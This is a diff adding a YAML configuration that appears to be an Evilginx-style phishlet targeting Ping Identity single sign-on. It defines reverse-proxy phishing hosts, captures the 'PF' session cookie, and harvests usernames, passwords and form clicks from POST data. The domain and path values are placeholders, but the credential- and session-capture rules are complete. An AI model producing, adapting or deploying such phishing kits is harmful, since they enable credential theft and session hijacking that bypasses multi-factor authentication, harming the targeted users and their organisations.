@@ -1,0 +1,32 @@
+name: 'pingidentitysso'
+author: '@jeffreygreen & @jamesbarnett'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'domain', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'subdomain', orig_sub: 'subdomain', domain: 'domain', session: true, is_landing: false, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: 'sso.domain'
+    keys: ['PF']
+auth_urls:
+  - 'Auth_Path'
+credentials:
+  username:
+    key: 'pf.username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pf.pass'
+    search: '(.*)'
+    type: 'post'
+  click:
+    key: 'pf.ok'
+    search: '(.*)'
+    type: 'post'
+  cancel: 
+    key: 'pf.cancel'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sso.domain'
+  path: 'Path'
